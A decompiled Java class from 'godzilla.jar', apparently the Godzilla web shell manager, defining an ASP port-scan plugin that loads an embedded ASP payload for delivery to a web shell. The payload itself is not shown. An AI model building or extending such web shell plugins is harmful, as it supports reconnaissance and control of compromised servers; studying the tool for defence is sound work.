/*    */ package shells.plugins.asp;
/*    */ 
/*    */ import core.annotation.PluginAnnotation;
/*    */ import java.io.IOException;
/*    */ import java.io.InputStream;
/*    */ import shells.plugins.generic.PortScan;
/*    */ import util.functions;
/*    */ 
/*    */ 
/*    */ @PluginAnnotation(payloadName = "AspDynamicPayload", Name = "PortScan", DisplayName = "端口扫描")
/*    */ public class APortScan
/*    */   extends PortScan
/*    */ {
/*    */   private static final String CLASS_NAME = "PortScan";
/*    */   
/*    */   public byte[] readPlugin() throws IOException {
/* 17 */     InputStream inputStream = getClass().getResourceAsStream(String.format("assets/%s.asp", new Object[] { "PortScan" }));
/* 18 */     return functions.readInputStreamAutoClose(inputStream);
/*    */   }
/*    */ 
/*    */   
/*    */   public String getClassName() {
/* 23 */     return "PortScan";
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\asp\APortScan.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */